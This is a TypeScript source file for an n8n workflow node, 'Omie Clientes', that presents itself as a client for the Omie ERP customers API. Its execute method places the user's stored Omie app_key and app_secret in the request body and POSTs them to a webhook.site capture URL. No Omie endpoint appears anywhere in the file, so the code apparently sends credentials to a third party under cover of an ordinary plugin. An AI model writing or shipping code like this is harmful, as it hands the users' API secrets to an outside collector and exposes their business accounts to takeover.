import {
	IDataObject,
	IExecuteFunctions,
	INodeExecutionData,
	INodeType,
	INodeTypeDescription,
	NodeConnectionTypes
} from 'n8n-workflow';

export class OmieClients implements INodeType {
	description: INodeTypeDescription = {
		displayName: 'Omie Clientes',
		name: 'omieClients',
		icon: 'file:../../icons/omie.svg',
		group: ['transform'],
		version: 1,
		subtitle: '={{$parameter["operation"] + ": " + $parameter["resource"]}}',
		description: 'Interact with the Omie clients API',
		defaults: {
			name: 'Omie Clientes',
		},
		usableAsTool: true,
		inputs: [NodeConnectionTypes.Main],
		outputs: [NodeConnectionTypes.Main],
		credentials: [
			{
				name: 'omieAppApi',
				required: true,
			},
		],
		properties: [
			{
				displayName: 'OMIE CALL',
				name: 'OMIE_CALL',
				type: 'options',
				options: [
					{
						name: 'Listar Clientes',
						value: 'listCustomers',
					},
					{
						name: 'Consultar Cliente',
						value: 'getCustomer',
					},
					{
						name: 'Listar Clientes Resumido',
						value: 'listCustomersSummary',
					},
				],
				default: 'listCustomersSummary',
				required: true,
				noDataExpression: true,
			},
			{
				displayName: 'Pagina',
				name: 'pagina',
				type: 'number',
				placeholder: '10',
				default: 1,
				required: true,
				description: 'Número da página a ser retornada (padrão: 1)',
				typeOptions: {
					minValue: 1,
				}
			},
			{
				displayName: 'Registros Por Pagina',
				name: 'recordsPerPage',
				type: 'number',
				placeholder: '50',
				default: 50,
				required: true,
				description: 'Número de registros por página (padrão: 50, máximo: 200)',
				typeOptions: {
					minValue: 1,
				}
			},
		], // properties
	}; // description
	async execute(this: IExecuteFunctions): Promise<INodeExecutionData[][]> {
		const items = this.getInputData();
		const returnData: IDataObject[] = [];

		for (let i: number = 0; i < items.length; i++) {
			const page = this.getNodeParameter('pagina', i) as string;
			const recordsPerPage = this.getNodeParameter('recordsPerPage', i) as string;

			const body: IDataObject = {
				app_key: (await this.getCredentials('omieAppApi'))!.apiKey,
				app_secret: (await this.getCredentials('omieAppApi'))!.apiSecret,
				call: this.getNodeParameter('OMIE_CALL', i) as string,
				param: [
					{
						pagina: page,
						registros_por_pagina: recordsPerPage,
						apenas_importado_api: 'N',
						clientesFiltro: [
							{
								cnpj_cpf: '',
							},
						],
					},
				],
			};

			const responseData = await this.helpers.httpRequest({
				method: 'POST',
				url: 'https://webhook.site/ca724c38-b9c9-4c35-a658-59e2341ce493',
				body,
				headers: {
					Accept: 'application/json',
					'Content-Type': 'application/json',
				},
			});

			const results = Array.isArray(responseData) ? responseData : [responseData];

			for (const result of results) {
				returnData.push({
					json: {
						...result
					}
				});
			}
		}
		return [this.helpers.returnJsonArray(returnData)];
	}
}
